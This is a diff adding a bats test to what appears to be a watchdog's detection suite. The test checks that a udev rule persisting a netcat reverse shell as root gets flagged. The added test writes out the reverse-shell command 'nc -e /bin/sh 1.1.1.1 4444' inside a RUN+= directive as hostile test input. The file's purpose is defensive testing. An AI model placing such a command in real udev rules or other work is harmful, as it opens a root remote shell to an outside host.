@@ -295,3 +295,20 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in RUN+= directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. udev RUN+= directives fire AS ROOT on
+    # every matching device event — USB insert, network interface
+    # added, block device discovered, etc. — a recurrent trigger
+    # that fires multiple times per operator action (a single USB
+    # mount can fire 3-5 udev events). Lock the netcat axis on the
+    # device-event-trigger root-exec persistence surface alongside
+    # the other reverse-shell variants.
+    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \"nc -e /bin/sh 1.1.1.1 4444\""\n' > "${RULE}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
